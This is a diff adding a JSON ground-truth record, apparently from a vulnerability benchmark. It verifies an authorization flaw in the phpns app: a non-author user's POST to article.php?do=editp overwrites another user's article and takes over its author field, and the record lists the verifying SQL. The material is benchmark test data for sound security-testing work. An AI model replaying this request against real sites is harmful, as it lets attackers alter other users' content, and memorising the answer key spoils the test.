@@ -1,0 +1,50 @@
+{
+  "gt_id": "GT-013",
+  "app": "phpns",
+  "verified_at": "2026-09-06T04:57:48.315979+00:00",
+  "verdict": "vulnerable",
+  "summary": "user1 POST article.php?do=editp returned 200; article 6 article_text changed DRHLGT_art_before_8670667825 -> DRHLGT_art_after_8670667825 (updated=True) and article_author became 'user1'.",
+  "sql_statements": [
+    {
+      "kind": "execute",
+      "sql": "UPDATE phpns_articles SET article_text='DRHLGT_art_before_8670667825' WHERE id=6"
+    },
+    {
+      "kind": "query",
+      "sql": "SHOW COLUMNS FROM phpns_articles"
+    },
+    {
+      "kind": "query",
+      "sql": "SELECT * FROM phpns_articles WHERE id=6 LIMIT 1"
+    },
+    {
+      "kind": "scalar",
+      "sql": "SELECT article_text FROM phpns_articles WHERE id=6"
+    },
+    {
+      "kind": "scalar",
+      "sql": "SELECT article_author FROM phpns_articles WHERE id=6"
+    }
+  ],
+  "steps": [
+    {
+      "kind": "instrument",
+      "table": "phpns_articles",
+      "row": "id=6",
+      "column": "article_text",
+      "token1": "DRHLGT_art_before_8670667825",
+      "token2": "DRHLGT_art_after_8670667825",
+      "author_before": "user2"
+    },
+    {
+      "kind": "replay",
+      "role": "user1 (not the article author)",
+      "request": "POST article.php?do=editp id=6 article_text=<token2>",
+      "status_code": 200,
+      "db_article_text_before": "DRHLGT_art_before_8670667825",
+      "db_article_text_after": "DRHLGT_art_after_8670667825",
+      "db_article_author_after": "user1",
+      "updated": true
+    }
+  ]
+}
